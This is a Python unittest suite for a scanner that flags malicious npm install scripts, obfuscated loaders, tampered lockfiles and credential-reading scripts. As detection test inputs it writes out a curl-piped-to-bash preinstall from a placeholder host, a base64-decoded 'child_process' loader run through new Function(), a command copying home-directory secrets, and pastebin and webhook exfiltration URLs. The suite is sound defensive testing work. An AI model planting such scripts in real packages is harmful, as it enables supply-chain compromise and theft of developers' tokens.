"""Tests for moat-scan-npm.

Run with:  python3 -m unittest discover scanner/tests
"""

from __future__ import annotations

import importlib.machinery
import importlib.util
import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stdout, redirect_stderr

HERE = os.path.dirname(os.path.abspath(__file__))
SCANNER_PATH = os.path.join(os.path.dirname(HERE), "moat-scan-npm")
FIXTURES = os.path.join(HERE, "fixtures", "npm")


def _load_scanner():
    spec = importlib.util.spec_from_loader(
        "moat_scan_npm",
        importlib.machinery.SourceFileLoader("moat_scan_npm", SCANNER_PATH),
    )
    module = importlib.util.module_from_spec(spec)
    # dataclasses resolve annotations through sys.modules, so register first
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


S = _load_scanner()


def run(argv):
    """Run main() with output captured. -> (exit code, stdout, stderr)."""
    out, err = io.StringIO(), io.StringIO()
    with redirect_stdout(out), redirect_stderr(err):
        code = S.main(argv)
    return code, out.getvalue(), err.getvalue()


def scan_fixture(name, extra=None):
    """-> (exit code, parsed json)"""
    argv = [os.path.join(FIXTURES, name), "--json", "--no-allow"] + (extra or [])
    code, out, _ = run(argv)
    return code, json.loads(out)


def ids(payload):
    return {f["id"] for f in payload["findings"]}


def by_id(payload, rule):
    return [f for f in payload["findings"] if f["id"] == rule]


def sev_of(payload, rule):
    return {f["severity"] for f in by_id(payload, rule)}


# ---------------------------------------------------------------------------
# the quiet half: ordinary work must not be interrupted
# ---------------------------------------------------------------------------


class TestDoesNotBlockOrdinaryWork(unittest.TestCase):
    def test_clean_app_is_clean(self):
        code, payload = scan_fixture("clean-app")
        self.assertEqual(payload["findings"], [])
        self.assertEqual(payload["summary"], {"high": 0, "medium": 0, "low": 0})
        self.assertEqual(code, 0)

    def test_ordinary_app_never_leaves_low(self):
        """sharp + husky + a node-gyp transitive: three notes, exit 0.

        This is the test that decides whether people keep the tool. A real
        project full of native builds must not produce a single medium.
        """
        code, payload = scan_fixture("ordinary-app")
        self.assertEqual(ids(payload), {"npm.lifecycle-script"})
        self.assertEqual(sev_of(payload, "npm.lifecycle-script"), {"low"})
        self.assertEqual(payload["summary"]["low"], 3)
        self.assertEqual(code, 0)

    def test_direct_dependency_is_low_transitive_is_medium(self):
        """The whole severity ladder in one assertion."""
        _, ordinary = scan_fixture("ordinary-app")
        chosen = [f for f in ordinary["findings"] if f["pkg"] == "sharp"][0]
        self.assertEqual(chosen["severity"], "low")
        self.assertIn("you listed yourself", chosen["evidence"])

        _, dropper = scan_fixture("transitive-dropper")
        unchosen = by_id(dropper, "npm.lifecycle-script")[0]
        self.assertEqual(unchosen["severity"], "medium")
        self.assertIn("did not choose", unchosen["evidence"])

    def test_prepare_in_a_registry_dependency_is_not_reported(self):
        """npm never runs `prepare` for a registry install.

        Published packages routinely ship a development `prepare` (tshy, tsc,
        husky). Reporting it fired 20 times on npm's own bundled tree and
        never once described something that would execute.
        """
        with tempfile.TemporaryDirectory() as d:
            _write_project(
                d,
                lock_packages={
                    "node_modules/tshy-user": {
                        "version": "1.0.0",
                        "resolved": "https://registry.npmjs.org/tshy-user/-/tshy-user-1.0.0.tgz",
                        "integrity": "sha512-fixture==",
                    }
                },
            )
            _write_installed(d, "tshy-user", {"prepare": "tshy && bash build.sh"})
            code, out, _ = run([d, "--json", "--no-allow"])
        self.assertEqual(json.loads(out)["findings"], [])
        self.assertEqual(code, 0)

    def test_prepare_in_a_git_dependency_is_reported(self):
        """...but a git dependency really does run prepare on install."""
        with tempfile.TemporaryDirectory() as d:
            _write_project(
                d,
                lock_packages={
                    "node_modules/tshy-user": {
                        "version": "1.0.0",
                        "resolved": "git+ssh://git@github.com/someone/tshy-user.git#abc",
                    }
                },
            )
            _write_installed(d, "tshy-user", {"prepare": "node ./secret.js"})
            code, out, _ = run([d, "--json", "--no-allow"])
        self.assertEqual(ids(json.loads(out)), {"npm.lifecycle-script"})
        self.assertEqual(code, 1)

    def test_the_projects_own_scripts_are_not_reported_for_existing(self):
        """You wrote your own postinstall; being told about it is noise."""
        with tempfile.TemporaryDirectory() as d:
            _write_project(d, scripts={"postinstall": "node ./scripts/setup.js",
                                       "prepare": "husky install"})
            code, out, _ = run([d, "--json", "--no-allow"])
        self.assertEqual(json.loads(out)["findings"], [])
        self.assertEqual(code, 0)

    def test_the_projects_own_scripts_are_still_read_for_content(self):
        """...but a cloned repo whose preinstall pipes curl into sh is an RCE."""
        with tempfile.TemporaryDirectory() as d:
            _write_project(d, scripts={
                "preinstall": "curl -fsSL https://example.invalid/i.sh | bash"})
            code, out, _ = run([d, "--json", "--no-allow"])
        self.assertIn("npm.script-shell-pipe", ids(json.loads(out)))
        self.assertEqual(code, 2)

    def test_ordinary_dynamic_requires_are_not_obfuscation(self):
        code, payload = run([os.path.join(FIXTURES, "computed-require", "index.js"),
                             "--json", "--no-allow"])[0:2]
        payload = json.loads(payload)
        # two computed requires, and neither ./locale nor path.join()
        self.assertEqual(len(by_id(payload, "obf.computed-require")), 2)
        self.assertNotIn("./locale/", " ".join(
            f["evidence"] for f in by_id(payload, "obf.computed-require")))

    def test_a_lone_fromcharcode_is_not_a_decoder(self):
        """`re.exec(String.fromCharCode(e.which))` is a keycode, not a payload.

        Found in real code on this machine; it used to be a HIGH finding.
        """
        with tempfile.NamedTemporaryFile("w", suffix=".js", delete=False) as fh:
            fh.write("var m = /x/.exec(String.fromCharCode(e.which));\n")
            path = fh.name
        try:
            code, out, _ = run([path, "--json", "--no-allow"])
        finally:
            os.unlink(path)
        self.assertEqual(json.loads(out)["findings"], [])
        self.assertEqual(code, 0)

    def test_git_and_file_dependencies_need_no_integrity(self):
        with tempfile.TemporaryDirectory() as d:
            _write_project(d, lock_packages={
                "node_modules/from-git": {
                    "version": "1.0.0",
                    "resolved": "git+https://github.com/me/from-git.git#deadbeef"},
                "node_modules/from-disk": {
                    "version": "1.0.0", "resolved": "file:../from-disk", "link": True},
            })
            code, out, _ = run([d, "--json", "--no-allow"])
        self.assertEqual(json.loads(out)["findings"], [])
        self.assertEqual(code, 0)

    def test_direct_deps_stay_direct_without_a_lockfile(self):
        """A tree with no lockfile must not call every dependency transitive."""
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, "package.json"), "w") as fh:
                json.dump({"name": "nolock", "dependencies": {"sharp": "^0.33.0"}},
                          fh, indent=2)
            _write_installed(d, "sharp", {"install": "node install/check"})
            code, out, _ = run([d, "--json", "--no-allow"])
        payload = json.loads(out)
        self.assertEqual(sev_of(payload, "npm.lifecycle-script"), {"low"})
        self.assertEqual(code, 0)

    def test_yarn_registry_alias_is_not_foreign(self):
        """yarn v1 writes registry.yarnpkg.com no matter what registry= says."""
        code, payload = scan_fixture("yarn-classic")
        flagged = " ".join(f["evidence"] for f in by_id(payload, "lock.foreign-registry"))
        self.assertNotIn("registry.yarnpkg.com", flagged)
        self.assertNotIn("lodash", flagged)


# ---------------------------------------------------------------------------
# the loud half: fixtures, exact rule ids and exit codes
# ---------------------------------------------------------------------------


class TestFixtures(unittest.TestCase):
    def test_transitive_dropper(self):
        """A dep nobody chose, whose postinstall runs a decoded string.

        `new Function(decoded)()` with the decode on a previous line is the
        exact shape of the simulated attack this scanner was written for.
        """
        code, payload = scan_fixture("transitive-dropper")
        self.assertEqual(ids(payload), {"npm.lifecycle-script", "obf.eval-decoded"})
        self.assertEqual(sev_of(payload, "obf.eval-decoded"), {"high"})
        self.assertEqual(code, 2)
        # the file the postinstall names was read, not just package.json
        files = {os.path.basename(f["file"]) for f in payload["findings"]}
        self.assertIn("setup.js", files)
        ev = by_id(payload, "obf.eval-decoded")[0]["evidence"]
        self.assertIn("decoded", ev)
        self.assertIn("child_process", ev)   # decoded for the reader, offline

    def test_the_file_behind_node_dash_e_is_read(self):
        """`node -e "try{require('./postinstall')}catch(e){}"` is the single
        most common postinstall on npm (core-js, es5-ext). The payload would
        be in the required file, so the scanner follows it there."""
        with tempfile.TemporaryDirectory() as d:
            _write_project(d, lock_packages={
                "node_modules/core-js": {
                    "version": "3.0.0", "hasInstallScript": True,
                    "resolved": "https://registry.npmjs.org/core-js/-/core-js-3.0.0.tgz",
                    "integrity": "sha512-fixture=="}})
            _write_installed(d, "core-js", {
                "postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""})
            with open(os.path.join(d, "node_modules", "core-js", "postinstall.js"),
                      "w") as fh:
                fh.write("const B = 'cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpOw==';\n"
                         "const d = Buffer.from(B, 'base64').toString();\n"
                         "new Function(d)();\n")
            code, out, _ = run([d, "--json", "--no-allow"])
        payload = json.loads(out)
        self.assertIn("obf.eval-decoded", ids(payload))
        self.assertIn("child_process", by_id(payload, "obf.eval-decoded")[0]["evidence"])
        self.assertEqual(code, 2)

    def test_token_theft(self):
        """Shai-Hulud shape: curl|sh, ~/.npmrc + ~/.ssh, exfil to a bare IP."""
        code, payload = scan_fixture("token-theft")
        self.assertEqual(
            ids(payload),
            {
                "npm.lifecycle-script",
                "npm.script-shell-pipe",
                "npm.script-credential-path",
                "npm.script-net-literal",
            },
        )
        self.assertEqual(code, 2)
        self.assertIn("high", sev_of(payload, "npm.script-net-literal"))
        # two scripts in one package must not collapse onto one line
        lines = {f["line"] for f in payload["findings"]}
        self.assertGreater(len(lines), 1)

    def test_lock_tamper(self):
        """Lockfile persistence: it survives npm ci and a fresh clone."""
        code, payload = scan_fixture("lock-tamper")
        self.assertEqual(ids(payload),
                         {"lock.foreign-registry", "lock.missing-integrity"})
        self.assertEqual(code, 2)
        sevs = {f["pkg"]: f["severity"] for f in by_id(payload, "lock.foreign-registry")}
        self.assertEqual(sevs["ansi-styles"], "high")   # pastebin
        self.assertEqual(sevs["ci-info"], "low")        # a github tarball is ordinary
        self.assertEqual(by_id(payload, "lock.missing-integrity")[0]["pkg"],
                         "supports-color")

    def test_bin_escape(self):
        code, payload = scan_fixture("bin-escape")
        self.assertEqual(ids(payload), {"npm.bin-outside-package"})
        self.assertEqual(code, 2)
        self.assertIn("sudo", by_id(payload, "npm.bin-outside-package")[0]["evidence"])

    def test_yarn_lock_is_parsed(self):
        code, payload = scan_fixture("yarn-classic")
        self.assertEqual(ids(payload), {"lock.foreign-registry"})
        self.assertEqual(sev_of(payload, "lock.foreign-registry"), {"high"})
        self.assertEqual(by_id(payload, "lock.foreign-registry")[0]["pkg"],
                         "tunnel-agent")
        self.assertEqual(code, 2)

    def test_pnpm_lock_requires_build_is_a_lifecycle_script(self):
        code, payload = scan_fixture("pnpm-app")
        self.assertEqual(ids(payload), {"npm.lifecycle-script"})
        pkgs = {f["pkg"]: f["severity"] for f in payload["findings"]}
        self.assertEqual(pkgs["esbuild"], "low")            # a direct dependency
        self.assertEqual(pkgs["telemetry-agent"], "medium")  # nobody chose it
        self.assertEqual(code, 1)

    def test_computed_require(self):
        _, out, _ = run([os.path.join(FIXTURES, "computed-require", "index.js"),
                         "--json", "--no-allow"])
        payload = json.loads(out)
        self.assertEqual(ids(payload), {"obf.computed-require", "obf.charcode-chain"})
        self.assertEqual(sev_of(payload, "obf.computed-require"), {"high"})

    def test_python_source_is_covered_by_the_same_engine(self):
        """setup.py: exec() of a marshalled/base64 blob, cmdclass override."""
        code, out, _ = run([os.path.join(FIXTURES, "py-sdist", "setup.py"),
                            "--json", "--no-allow"])
        self.assertEqual(ids(json.loads(out)), {"obf.eval-decoded"})
        self.assertEqual(code, 2)


# ---------------------------------------------------------------------------
# CLI contract: the shims depend on every line of this
# ---------------------------------------------------------------------------


class TestCLI(unittest.TestCase):
    def test_exit_codes(self):
        self.assertEqual(scan_fixture("clean-app")[0], 0)
        self.assertEqual(scan_fixture("ordinary-app")[0], 0)   # low only
        self.assertEqual(scan_fixture("pnpm-app")[0], 1)       # medium
        self.assertEqual(scan_fixture("token-theft")[0], 2)    # high

    def test_min_severity_changes_the_exit_code(self):
        code, payload = scan_fixture("pnpm-app", ["--min-severity", "high"])
        self.assertEqual(payload["findings"], [])
        self.assertEqual(code, 0)

    def test_json_schema(self):
        _, payload = scan_fixture("token-theft")
        self.assertEqual(set(payload), {"findings", "summary"})
        self.assertEqual(set(payload["summary"]), {"high", "medium", "low"})
        for f in payload["findings"]:
            self.assertEqual(
                set(f),
                {"id", "severity", "file", "line", "evidence", "why", "proceed", "pkg"},
            )
            self.assertIn(f["severity"], ("high", "medium", "low"))
            self.assertGreaterEqual(f["line"], 1)
            self.assertLessEqual(len(f["evidence"]), S.EVIDENCE_MAX)

    def test_quiet_prints_nothing(self):
        code, out, _ = run([os.path.join(FIXTURES, "token-theft"), "-q", "--no-allow"])
        self.assertEqual(out, "")
        self.assertEqual(code, 2)

    def test_human_output_has_a_way_out(self):
        code, out, _ = run([os.path.join(FIXTURES, "token-theft"),
                            "--no-color", "--no-allow"])
        self.assertIn("why:", out)
        self.assertIn("proceed:", out)
        self.assertIn("MOAT_SANDBOX=0", out)
        self.assertIn("scanner-allow.conf", out)

    def test_allow_file_suppresses_and_says_so(self):
        with tempfile.NamedTemporaryFile("w", suffix=".conf", delete=False) as fh:
            fh.write("# fixture allow file\npkg=analytics-core rule=npm.script-*\n")
            allow = fh.name
        try:
            code, out, _ = run([os.path.join(FIXTURES, "token-theft"),
                                "--no-color", "--allow-file", allow])
            self.assertIn("hidden by allow rules", out)
            self.assertEqual(code, 1)   # only the medium lifecycle note is left
        finally:
            os.unlink(allow)

    def test_max_per_rule_collapses_human_output_only(self):
        with tempfile.TemporaryDirectory() as d:
            packages = {}
            for i in range(15):
                packages["node_modules/pkg%02d" % i] = {
                    "version": "1.0.0", "hasInstallScript": True,
                    "resolved": "https://registry.npmjs.org/p/-/p-1.0.0.tgz",
                    "integrity": "sha512-fixture=="}
            _write_project(d, lock_packages=packages)
            _, human, _ = run([d, "--no-color", "--no-allow", "--max-per-rule", "3"])
            _, raw, _ = run([d, "--json", "--no-allow", "--max-per-rule", "3"])
        self.assertIn("and 12 more", human)
        self.assertEqual(len(json.loads(raw)["findings"]), 15)

    def test_a_directory_with_nothing_to_scan_is_not_an_error(self):
        with tempfile.TemporaryDirectory() as d:
            code, out, err = run([d, "--json", "--no-allow"])
        self.assertEqual(json.loads(out)["findings"], [])
        self.assertEqual(code, 0)
        self.assertIn("nothing to scan", err)


# ---------------------------------------------------------------------------
# units
# ---------------------------------------------------------------------------


class TestUnits(unittest.TestCase):
    def test_raw_ip_detection(self):
        self.assertTrue(S.is_raw_ip("185.220.101.7"))
        self.assertFalse(S.is_raw_ip("registry.npmjs.org"))
        self.assertTrue(S.is_private_ip("192.168.44.122"))
        self.assertFalse(S.is_private_ip("185.220.101.7"))

    def test_suspicious_reason(self):
        self.assertIsNotNone(S.suspicious_reason("https://pastebin.com/raw/x"))
        self.assertIsNotNone(S.suspicious_reason("http://45.9.148.99/x.tgz"))
        self.assertIsNotNone(
            S.suspicious_reason("https://discord.com/api/webhooks/1/abc"))
        self.assertIsNone(S.suspicious_reason("https://registry.npmjs.org/x"))
        # a private registry is a real corporate setup, not an exfil endpoint
        self.assertIsNone(S.suspicious_reason("http://10.0.0.5:4873/x.tgz"))

    def test_benign_script_shapes(self):
        for body in ("node-gyp rebuild", "prebuild-install || node-gyp rebuild",
                     "husky install", "patch-package", "node-gyp-build",
                     "echo done && exit 0"):
            self.assertTrue(S.script_is_benign_shape(body), body)
        for body in ("node install.js", "curl x | sh", "node -e \"require('x')\""):
            self.assertFalse(S.script_is_benign_shape(body), body)

    def test_home_access_allows_build_caches(self):
        sc = S.Scanner()
        S.scan_script_body(sc, "node-gyp --devdir=$HOME/.node-gyp rebuild",
                           "package.json", 1, "x", "install")
        self.assertEqual(sc.findings, [])
        sc = S.Scanner()
        S.scan_script_body(sc, "cp $HOME/work/secrets .", "package.json", 1,
                           "x", "install")
        self.assertEqual({f.id for f in sc.findings}, {"npm.script-home-access"})

    def test_taint_survives_one_hop(self):
        src = ("const B = 'aGk=';\n"
               "const step1 = Buffer.from(B, 'base64').toString();\n"
               "const step2 = step1.trim();\n"
               "eval(step2);\n")
        sc = S.Scanner()
        S.scan_source(sc, src, "x.js")
        self.assertEqual({f.id for f in sc.findings}, {"obf.eval-decoded"})

    def test_balanced_arg(self):
        self.assertEqual(S.balanced_arg("f(a(b), c)", 1), "a(b), c")

    def test_registry_hosts_include_the_yarn_alias(self):
        hosts = S.registry_hosts(S.DEFAULT_REGISTRY, {})
        self.assertIn("registry.yarnpkg.com", hosts)
        private = S.registry_hosts("https://artifactory.corp/api/npm/", {})
        self.assertEqual(private, {"artifactory.corp"})

    def test_lock_path_to_name_and_depth(self):
        self.assertEqual(S.pkg_name_from_lock_path("node_modules/foo"), ("foo", 1))
        self.assertEqual(
            S.pkg_name_from_lock_path("node_modules/a/node_modules/@s/b"),
            ("@s/b", 2))

    def test_evidence_is_bounded_and_flat(self):
        got = S.clean_evidence("a\n\tb   c" + "x" * 400)
        self.assertLessEqual(len(got), S.EVIDENCE_MAX)
        self.assertNotIn("\n", got)


# ---------------------------------------------------------------------------
# fixture helpers
# ---------------------------------------------------------------------------


def _write_project(d, scripts=None, deps=None, lock_packages=None):
    pkg = {"name": "tmp-project", "version": "1.0.0", "private": True}
    if scripts:
        pkg["scripts"] = scripts
    if deps:
        pkg["dependencies"] = deps
    with open(os.path.join(d, "package.json"), "w") as fh:
        json.dump(pkg, fh, indent=2)
    packages = {"": {"name": "tmp-project"}}
    packages.update(lock_packages or {})
    with open(os.path.join(d, "package-lock.json"), "w") as fh:
        json.dump({"name": "tmp-project", "lockfileVersion": 3,
                   "packages": packages}, fh, indent=2)


def _write_installed(d, name, scripts):
    where = os.path.join(d, "node_modules", name)
    os.makedirs(where, exist_ok=True)
    with open(os.path.join(where, "package.json"), "w") as fh:
        json.dump({"name": name, "version": "1.0.0", "scripts": scripts}, fh, indent=2)


if __name__ == "__main__":
    unittest.main()
